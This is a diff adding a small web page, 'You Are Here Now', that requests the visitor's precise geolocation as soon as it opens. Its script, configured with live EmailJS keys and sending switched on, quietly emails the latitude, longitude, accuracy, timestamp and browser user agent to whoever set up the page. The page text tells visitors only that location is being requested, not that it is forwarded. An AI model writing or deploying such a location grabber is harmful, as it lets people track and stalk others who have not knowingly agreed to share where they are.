@@ -1,0 +1,147 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>You Are Here Now</title>
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+  <style>
+    body{font-family:system-ui,Segoe UI,Roboto,Arial,sans-serif; padding:20px; color:#111}
+    .card{max-width:720px;margin:36px auto;padding:20px;border-radius:12px;border:1px solid #e6e6e6}
+    pre{background:#f7f7f7;padding:10px;border-radius:8px;overflow:auto}
+    .muted{color:#666;font-size:0.95rem}
+    .err{color:#9b1c1c}
+    .ok{color:#0b6f31}
+  </style>
+</head>
+<body>
+  <div class="card">
+      <h2>You Are Here Now</h2>
+    <p class="muted">This page will request your browser for location **immediately** when opened. Browsers on mobile may require HTTPS or a user gesture to provide precise location. If location fails, follow the on-screen instructions.</p>
+    <div id="status">Requesting location…</div>
+    <div id="info" style="margin-top:12px"></div>
+    <pre id="debug" class="muted" style="display:none"></pre>
+    <p class="muted" style="margin-top:12px">If you want the location emailed, configure EmailJS keys in the script (YOUR_PUBLIC_KEY, YOUR_SERVICE_ID, YOUR_TEMPLATE_ID).</p>
+  </div>
+
+<script>
+// --- CONFIGURE THESE ---
+const EMAILJS_PUBLIC_KEY = "6FraTx3djS-hFvUZm";
+const EMAILJS_SERVICE_ID = "service_5qqap3j";
+const EMAILJS_TEMPLATE_ID = "template_w4hagwn";
+// Set to false to disable automatic email sending
+const SEND_EMAIL = true;
+// ----------------------
+
+// initialize EmailJS safely
+function initEmailJs() {
+  try {
+    if (typeof emailjs !== "undefined" && emailjs.init) {
+      emailjs.init(EMAILJS_PUBLIC_KEY);
+      return true;
+    } else {
+      console.warn("EmailJS library not loaded.");
+      return false;
+    }
+  } catch (e) {
+    console.error("EmailJS init error:", e);
+    return false;
+  }
+}
+
+function showStatus(html, cls) {
+  const s = document.getElementById("status");
+  s.innerHTML = html;
+  s.className = cls ? cls : "";
+}
+
+function debugLog(obj) {
+  const pre = document.getElementById("debug");
+  pre.style.display = "block";
+  pre.textContent = JSON.stringify(obj, null, 2);
+  console.log(obj);
+}
+
+function sendEmailPayload(payload) {
+  if (!SEND_EMAIL) {
+    showStatus("Location captured (email disabled).", "ok");
+    debugLog({email: "disabled", payload});
+    return;
+  }
+  if (!initEmailJs()) {
+    showStatus("Location captured but EmailJS unavailable. See console for details.", "err");
+    debugLog({emailjs: "init_failed"});
+    return;
+  }
+  showStatus("Sending email…");
+  emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, payload)
+    .then(function(resp) {
+      showStatus("Location captured and email sent successfully.", "ok");
+      debugLog({emailjs_response: resp});
+    })
+    .catch(function(err) {
+      showStatus("Email failed. See debug for details.", "err");
+      debugLog({emailjs_error: err});
+      alert("Email sending failed. Open console for details.");
+    });
+}
+
+function handlePosition(pos) {
+  const lat = pos.coords.latitude;
+  const lon = pos.coords.longitude;
+  const acc = pos.coords.accuracy;
+  const ts = new Date(pos.timestamp).toISOString();
+  document.getElementById("info").innerHTML = `
+    <strong>Latitude:</strong> ${lat}<br>
+    <strong>Longitude:</strong> ${lon}<br>
+    <strong>Accuracy:</strong> ±${Math.round(acc)} m<br>
+    <strong>Timestamp:</strong> ${ts}<br>
+    <a href="https://maps.google.com/?q=${lat},${lon}" target="_blank">Open in Google Maps</a>
+  `;
+  const payload = {
+    latitude: lat,
+    longitude: lon,
+    accuracy: acc,
+    timestamp: ts,
+    userAgent: navigator.userAgent
+  };
+  // send email (if configured)
+  sendEmailPayload(payload);
+}
+
+function handleError(err) {
+  const msg = "Error obtaining location: " + (err && err.message ? err.message : JSON.stringify(err));
+  showStatus(msg, "err");
+  debugLog({geo_error: err});
+  // Helpful hints
+  let hint = "";
+  if (err && err.code) {
+    switch(err.code) {
+      case 1: hint = " Permission denied by user. The user must allow location access."; break;
+      case 2: hint = " Position unavailable. Try again or ensure device has a location source (GPS/Wi‑Fi)."; break;
+      case 3: hint = " Timeout obtaining location. Try again."; break;
+    }
+  }
+  document.getElementById("info").innerHTML = "<div class='err'>" + hint + "</div>" +
+    "<div class='muted'>Mobile browsers often require HTTPS and/or a user gesture. If you're testing from a file:// URL, try hosting via GitHub Pages or Netlify (free, provides HTTPS).</div>";
+}
+
+// Auto-request geolocation on load
+window.addEventListener("load", function() {
+  // Delay slightly to allow mobile browsers to consider user interaction in some cases.
+  setTimeout(function(){
+    if (!("geolocation" in navigator)) {
+      showStatus("Geolocation is not supported by this browser.", "err");
+      return;
+    }
+    // Request high accuracy, short timeout
+    navigator.geolocation.getCurrentPosition(handlePosition, handleError, {
+      enableHighAccuracy: true,
+      timeout: 20000,
+      maximumAge: 0
+    });
+  }, 300);
+});
+</script>
+</body>
+</html>
